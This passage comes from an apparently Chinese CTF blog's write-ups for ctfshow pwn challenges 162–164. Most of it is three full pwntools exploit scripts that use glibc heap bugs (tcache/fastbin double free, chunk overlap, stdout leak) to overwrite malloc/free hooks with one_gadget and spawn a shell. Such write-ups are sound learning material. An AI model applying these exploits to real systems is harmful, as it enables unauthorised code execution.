<li>先申请三个不同大小的chunk，chunk2为符合unsortedbin大小的chunk(我们得获取main_arena将其修改为IO_stdout),然后释放7次chunk2，填满tcachebins，然后释放将chunk2挂进unsortedbin中，使其与tcachebin重合</li>
<li>然后申请回chunk1，将ptr-&gt;chunk1，这时扩展chunk1使其可以溢出到chunk2修改其fd指针为IO_stdout(后三位字节是不变的，运行exp得多试)将其挂进bins，随后将ptr清零，打tcachebins dup，修改stdout的flag和write_base泄露出libc</li>
<li>与上面一样的方法打_free_hook-&gt;one_gadget</li>
</ol>
<p><strong>在exp中有更详细的注释</strong></p>
<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>psl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>ps = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>pc = <span class="hljs-keyword">lambda</span> data : p.recvuntil(data)<br>ph = <span class="hljs-keyword">lambda</span> data : <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(data))<br><br><br>p = process(<span class="hljs-string">&#x27;./pwn164&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn164&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;pwn.challenge.ctf.show&quot;,28120)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>    pc(<span class="hljs-string">&quot;Choice:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">b&#x27;\xa0&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    pc(<span class="hljs-string">&quot;Size?&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(size))<br>    <br>    <span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> content == <span class="hljs-string">b&#x27;\xa0&#x27;</span>:<br>            pc(<span class="hljs-string">&quot;Content?&quot;</span>)<br>            ps(content)<br>            <span class="hljs-keyword">return</span><br>        pc(<span class="hljs-string">&quot;Content?&quot;</span>)<br>        ps(content)    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    cmd(<span class="hljs-number">2</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">transform</span>():<br>	cmd(<span class="hljs-number">1433233</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>():<br>	add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x1</span>))<br>	delete()	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>	gadget=[<span class="hljs-number">0x4f2be</span>,<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>	magic = <span class="hljs-number">0x0FBAD1887</span><br>	offest = <span class="hljs-string">b&#x27;\x60\xc7&#x27;</span><br>	add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># chunk1</span><br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>	add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># chunk2</span><br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x1</span>)) <span class="hljs-comment"># chunk3</span><br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)   <br>	add(<span class="hljs-number">0x90</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x1</span>)) <span class="hljs-comment"># ptr-&gt;chunk2</span><br><br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x1B[5;31m[+]==========fill the tcachebins==========[+]\x1B[0m&quot;</span>)<br>	<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		delete()<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment">#let the chunk2_addr in unsortedbins to get main arena and let the ptr = 0</span><br>	add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;1&#x27;</span>) <span class="hljs-comment">#apply the chunk1 back,ptr = chunk1_addr</span><br>	<span class="hljs-comment">#chunks bu ju is :chunk1 0x31 chunk2 0xa1 chunk3 0x21 now</span><br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x1B[5;31m[+]==========leak the libc==========[+]\x1B[0m&quot;</span>)<br>	<br>	add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x91</span>)+offest) <span class="hljs-comment">#chunk1 is 0x71 now filled it and yichu to change the main_arena to be the _IO_stdout_addr</span><br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment"># free chunk1 ptr =0</span><br><br>	add(<span class="hljs-number">0x90</span>,offest) <span class="hljs-comment"># apply the tcachebin chunk this chunk --&gt; _IO_stdout, ptr = chunk2_addr</span><br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<span class="hljs-comment">#_IO_list_stdout_addr is into tcachebins now,we need to make ptr =0, but we can&#x27;t change _IO_list_stdout &#x27;s bins,so this is why we need to change chunk2&#x27;size to 0x91. We aim to don&#x27;t break bins relationship</span><br>	bug()<br>	sleep(<span class="hljs-number">1</span>)<br>	add(<span class="hljs-number">0x90</span>,p64(magic)+ p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x58</span>))<span class="hljs-comment">#IO ATTACK to leak the libc</span><br>	<br>	<span class="hljs-comment">#pause()</span><br>	<br>	leak_libc = u64(pc(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>::].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	ph(leak_libc)<br>	<br>	libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>	base = leak_libc - libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>	ph(base)<br>	ogg = base + gadget[<span class="hljs-number">2</span>]<br>	free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x1B[5;31m[+]==========double free --&gt; free_hook --&gt; one_gadget==========[+]\x1B[0m&quot;</span>)<br>	transform()<span class="hljs-comment">#ptr =0</span><br>	<br>	add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#this method is as above,i don&#x27;t explain more</span><br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>	add(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>	add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>	add(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#da tcache bin dup</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	    delete()<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>	add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>	add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x71</span>)+p64(free_hook-<span class="hljs-number">0x8</span>))<br>	<span class="hljs-comment">#bug()</span><br>	add(<span class="hljs-number">0</span>)    <br>	<span class="hljs-comment">#delete()</span><br>	add(<span class="hljs-number">0xa0</span>)<br>	add(<span class="hljs-number">0</span>)<br>	add(<span class="hljs-number">0xa0</span>,p64(<span class="hljs-number">0</span>)+p64(ogg))<br>	<span class="hljs-comment">#bug()</span><br>	delete()<br>	<br>	p.interactive()	<br>	<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14401761.html">roarctf_2019_realloc_magic - LynneHuan - 博客园</a></p>
<h1 id="ctfshow-pwn-163"><a href="#ctfshow-pwn-163" class="headerlink" title="ctfshow-pwn-163"></a>ctfshow-pwn-163</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input yes or no ,yes is process no is remote!\n&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = process(<span class="hljs-string">&quot;./pwn163&quot;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;n&quot;</span> <span class="hljs-keyword">in</span> choice : <br>    p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28292</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>psl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>ps = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>pc = <span class="hljs-keyword">lambda</span> data : p.recvuntil(data)<br>ph = <span class="hljs-keyword">lambda</span> data : <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choose</span>):<br>    pc(<span class="hljs-string">&quot;Command: &quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(choose))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    pc(<span class="hljs-string">&quot;Size: &quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>): <br>    cmd(<span class="hljs-number">2</span>)<br>    pc(<span class="hljs-string">&quot;Index: &quot;</span>)   <br>    psl(<span class="hljs-built_in">str</span>(idx))<br>    pc(<span class="hljs-string">&quot;Size: &quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(size))<br>    pc(<span class="hljs-string">&quot;Content: &quot;</span>)<br>    ps(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    pc(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    pc(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(idx))<br><br>    <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x1B[5;31m[+]==start chunk overlapping==[+]\x1B[0m&quot;</span>)<br>    <br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x90</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x90</span>)<span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x141</span>))<br>    delete(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">0x90</span>)<span class="hljs-comment">#4</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x1B[5;31m[+]==========leak the libc==========[+]\x1B[0m&quot;</span>)<br>    show(<span class="hljs-number">2</span>)<br>    malloc_hook = u64(pc(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-<span class="hljs-number">0x68</span><br>    ph(malloc_hook)<br>    base = malloc_hook-libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>    free_hook = base+libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>    realloc = base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>    ph(realloc)<br>    realloc_hook = malloc_hook - <span class="hljs-number">0x8</span><br>    ogg = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>    ogg = base + ogg[<span class="hljs-number">1</span>]<br>    ph(base)<br>    ph(ogg)<br>    add(<span class="hljs-number">0x90</span>)<br>    <br>    add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>   <br>    <br>    add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#6</span><br>    <br>    delete(<span class="hljs-number">6</span>)<br>    delete(<span class="hljs-number">5</span>)<br>    pay = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>)<br>    edit(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(pay),pay)<br>    <br>    add(<span class="hljs-number">0x68</span>)<br>    add(<span class="hljs-number">0x68</span>)<br>    p1 = p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\x00\x00\x00&#x27;</span>+p64(ogg)+p64(realloc+<span class="hljs-number">10</span>)<br>    edit(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(p1),p1)<br>        <br>    <span class="hljs-comment">#bug()</span><br>    add(<span class="hljs-number">0x10</span>)<br>      <br>    p.interactive()<br>    <br>exp()<br></code></pre></td></tr></table></figure>

<h1 id="ctfshow-pwn-162"><a href="#ctfshow-pwn-162" class="headerlink" title="ctfshow-pwn-162"></a>ctfshow-pwn-162</h1><p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28154</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn162&#x27;)</span><br>ph = <span class="hljs-keyword">lambda</span> data : <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(data))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;size of the daniu&#x27;s name: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;daniu&#x27;s name:&quot;</span>)<br>    p.send(name)<br>    p.recvuntil(<span class="hljs-string">&quot;daniu&#x27;s message:&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;xxxx&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add2</span>(<span class="hljs-params">p1</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;size of the daniu&#x27;s name: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x68</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;daniu&#x27;s name:&quot;</span>)<br>    p.send(p1)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;daniu&#x27;s index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><br>offest = <span class="hljs-number">0xa55</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;jian&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;lian&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;lian&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">b&#x27;jian&#x27;</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;jian&#x27;</span>)<span class="hljs-comment">#4</span><br><span class="hljs-comment">#add(0x7f,b&#x27;jian&#x27;,b&#x27;aaaa&#x27;)#4</span><br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#delete(0)</span><br><br><span class="hljs-comment">#add(0x7f,b&#x27;\xee&#x27;,b&#x27;wt1122f&#x27;)</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;\xdd\x25&#x27;</span>)<br><br><span class="hljs-comment">#add(0x20,p64(0x00000000202020),b&#x27;add&#x27;)</span><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\xd0&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\xd0&#x27;</span>) <br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\xd0&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\xd0&#x27;</span>)<br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">51</span>)+p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span><br>add2(p1)<br>_IO_2_1_stderr_192 = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23(64).so&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(_IO_2_1_stderr_192)) <br>base = _IO_2_1_stderr_192 - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="hljs-number">192</span><br>ph(base)<br>realloc = base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>malloc_hook = base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>ph(malloc_hook)<br>p.recv()<br>p.sendline(<span class="hljs-string">b&#x27;xxxx&#x27;</span>)<br>one_gadgets = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>]<br>ogg = one_gadgets[<span class="hljs-number">0</span>] +base <br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x68</span>,p64(fake_chunk))<br>add(<span class="hljs-number">0x68</span>,p64(fake_chunk))<br>add(<span class="hljs-number">0x68</span>,p64(fake_chunk))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">0x8</span>)+p64(<span class="hljs-number">0</span>) +p64(ogg)<br>add(<span class="hljs-number">0x68</span>,p2)<br>p.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br><span class="hljs-comment">#bug()</span><br>p.interactive() <br>           <br></code></pre></td></tr></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/about/links/2025/12/22/FZNCTF-PWN-WP">← 下一篇 FZNCTF-Langx-PWN-WP</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/about/links/2025/12/22/IO_FILE%E5%88%A9%E7%94%A8%E4%B9%8B%E5%88%A9%E7%94%A8_IO_2_1_stdout%E6%B3%84%E9%9C%B2libc">IO_FILE利用之利用_IO_2_1_stdout泄露libc 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo" style="margin:0;border-radius:0;"></a><h1 id="Dr"><a href="/">Langx</a></h1><div id="description"><p>this world is pretty</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/langx1ng"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2867485668@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a><a class="social" target="_blank" rel="noopener" 